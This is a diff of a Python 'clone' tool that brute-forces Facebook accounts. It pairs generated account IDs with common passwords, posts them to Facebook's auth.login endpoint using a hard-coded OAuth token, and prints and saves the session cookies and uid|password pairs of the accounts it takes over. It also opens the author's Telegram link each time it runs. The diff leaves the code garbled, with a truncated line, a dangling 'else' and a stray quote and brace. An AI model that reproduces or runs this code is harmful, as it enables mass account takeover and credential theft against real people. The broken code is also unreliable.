@@ -1,20 +1,9 @@
-#OWNER MOSABBIR #FUCK_XX
-#mosabbirold_FUCK_XNX #FUCK_XX
-#GIFT BY MOSABBIR #FUCK_XX
-#OPENED BY MOSABBIR #FUCK_XX
-#HELP BY SIKRA NIKNAME(H41N4)
 import os, sys, json, uuid, string, random, requests
 from concurrent.futures import ThreadPoolExecutor
 import os, sys, json, uuid, string, random, requests
 from concurrent.futures import ThreadPoolExecutor as tred
 
-loop = 0 
-oks = []
-cps = []
-gen = []
-#______________OLD UA_______________#
-def SEX22():
-    url5 = ["Mozilla/5.0 (Linux; Android 10; Pixel 4 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 9; Samsung Galaxy S9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:118.0) Gecko/20100101 Firefox/118.0"]
+ndroid 10; Pixel 4 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 9; Samsung Galaxy S9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36","Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:118.0) Gecko/20100101 Firefox/118.0"]
     return random.choice(url5)
 #______________OLD UA_______________#
 def fuck_xnxx():
@@ -56,7 +45,7 @@ def ____banner____():
  |_|  |_|\___/|___/\__,_|_.__/|_.__/|_|_|    '  V/1.1
 \n---------------------------------
 [âœª] OWNER      : MOSABBIR 
-[âœª] DEVELOPER  :  MOSABBIR
+[âœª] DEVELOPER  : MOSABBIR
 [âœª] STATUS     : FREE [+] V/1.1
 [âœª] TOOLS      : OLD & RANDOM & FILE
 ---------------------------------""")
@@ -64,29 +53,16 @@ def ____banner____():
 #______________MAIN DEF_______________#
 def main():
     ____banner____()
-    print("[1] FILE CLONE [SOON] ")
-    print("[2] RANDOM CLONEv[WORK]");os.system("xdg-open https://t.me/mosabbirhossainsajib")
-    print("[3] START CLONE [2009][WORK]")
-    print("[4] NAGAD HALF INFO[]SOON")
-    print("[5] NAGAD BAN [SOON]")
+    print("[1] START CLONE [2009][WORK]");os.system("xdg-open https://t.me/mosabbirhossainsajib")
     print("-------------------------------")
     select = input("SELECT OPTION : ")
-    if select == "3":
-        fuckMyxmosabbirold("100000")
-    if select == "2":
-    	print(" FUCK RANDOM")
     if select == "1":
-    	print("COMIN SOON")
-    if select == "4":
-    	print("COMIN SOON")
-    if select == "5":
-        print("COMIN SOON")
-    
-    else:
-        main()
-        
-#______________OLD DEF_______________#
+        fuckMyxmosabbirold("100000")
 
+else:
+        main()
+       
+       #______________OLD DEF_______________#
 def fuckMyxmosabbirold(series):
     ____banner____()
     os.system("xdg-open https://t.me/mosabbirhossainsajib")
@@ -109,10 +85,10 @@ def fuckMyxmosabbirold(series):
         for love in gen:
             ids = SEX + love
             passlist = ["123456", "1234567", "12345678", "123456789"," iloveyou","1234567890","Bangladesh","135790"]
-            Fuck_xnxx.submit(Fucking_life, ids, passlist)
+Fuck_xnxx.submit(Fucking_life, ids, passlist)
     sys.exit("\n-------------------------------")
     
-#______________OLD METHOD_______________#   
+    #______________OLD METHOD_______________#   
 
 def Fucking_life(ids, passlist):
     global loop, oks, cps
@@ -137,85 +113,3 @@ def Fucking_life(ids, passlist):
         loop += 1
     except Exception as e:
         pass
-        
-#______________RANDDOM DEF_______________#
-
-def fuckMyxmosabbirrandom:
-    ____banner____()
-    os.system("xdg-open https://t.me/mosabbirhossainsajib")
-    print(' EXAMPLE SIM CODE : [016] [017] [018] [019]')
-    code=input(' ENTER SIM CODE >> ')
-    
-    print(' EXAMPLE LIMIT : [1000] [2000] [5000] [10000]')
-    try:
-        limit=int(input(' ENTER LIMIT >> '))
-    except ValueError:
-        limit=50000
-    clear()
-    for nmbr in range(limit):
-        nmp=''.join(random.choice(string.digits) for _ in range(8))
-        user.append(nmp)
-    with tred(max_workers=40) as fuckas:
-        tl=str(len(user))
-        ____banner____()
-        print('---------------------------------')
-        print(' TOTAL ACCOUNT : '+tl)
-        print(' YOUR SIM CODE : '+code)
-        print(' \33[0;42mFAST SPEED CLONING\033[0;92m ')
-        print(' PROGRESS HAS BEEN RUNNING PLEASE WAIT ')
-        print('---------------------------------')
-        
-        for psx in user:
-            ids=code+psx
-            passlist=[psx,ids,ids[:7],ids[:6],]
-            fuckas.submit(FUCK_FRIEND,ids,passlist)
-    
-    print(' THE PROGRESS HAS BEEN COMPLETE ')
-    print(' TOTAL OK ID '+str(len(oks)))
-    print(' TOTAL CP ID '+str(len(cps)))
-    input(' PRESS ENTER TO BACK  : ')
-    BROKEN_ASIF()
-    
-#______________RANDDOM METHOD_______________#
-
-def FUCK_FRIEND(ids,passlist):
-    global oks
-    global cps
-    global loop
-    try:
-        for pas in passlist:
-            sys.stdout.write(f'\r\x1b[[\x1b[â‚³Ó¾â‚¦_â‚µâ±¤â‚³â‚µâ‚­\x1b[]\x1b[-\x1b[[[{loop}\x1b[]\x1b[1;97m-\x1b[38;5;196m[\x1b[38;5;46mOK-{len(oks)}\x1b[]')
-            sys.stdout.flush()
-            adid=str(uuid.uuid4())
-            device_id=str(uuid.uuid4())
-            datax={'adid': adid, 'format': 'json', 'device_id': device_id, 'email': ids, 'password': pas, 'generate_analytics_claims': '1', 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'meta_inf_fbmeta': '', 'currently_logged_in_userid': '0', 'fb_api_req_friendly_name': 'authenticate'}
-            header={'User-Agent': 'Mozilla/5.0 (Linux; Android 5.1.1; i-mobile IQ Z PRO Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/39.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/422.0.0.18.107;]', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive', 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Friendly-Name': 'authenticate', 'X-FB-Connection-Bandwidth': '21435', 'X-FB-Net-HNI': '35793', 'X-FB-SIM-HNI': '37855', 'X-FB-Connection-Type': 'unknown', 'Content-Type': 'application/x-www-form-urlencoded', 'X-FB-HTTP-Engine': 'Liger'}
-            url='https://b-graph.facebook.com/method/auth.login'
-            reqx=requests.post(url,data=datax,headers=header).json()
-            if 'session_key' in reqx:
-                try:
-                    uid=reqx['uid']
-                except:
-                    uid=ids
-                if str(uid) in oks:
-                    break
-                else:
-                    print('\r\r \033[1;32m[MOSABBIR-ACTIVE] '+str(uid)+' | '+pas+'\033[1;37m')
-                    coki=";".join(i["name"]+"="+i["value"] for i in reqx["session_cookies"])
-                    print('\033[3;34m [COOKIE_â‡ï¸] '+coki)
-                    open('/sdcard/MOSABBIR-ACTIVE.txt','a').write(str(uid)+' | '+pas+'\n')
-                    oks.append(str(uid))
-                    break
-            elif 'www.facebook.com' in reqx['error_msg']:
-                print('\r\r \033[1;35m[MOSABBIR-INCTIVE] '+ids+' | '+pas+'\033[1;37m')
-                open('/sdcard/MOSABBIR-INCTIVE.txt','a').write(ids+'|'+pas+'\n')
-                cps.append(ids)
-                break
-            else:
-                continue
-        loop+=1
-    except:
-        pass"""
-        }
-if __name__ == "__main__":
-    main()
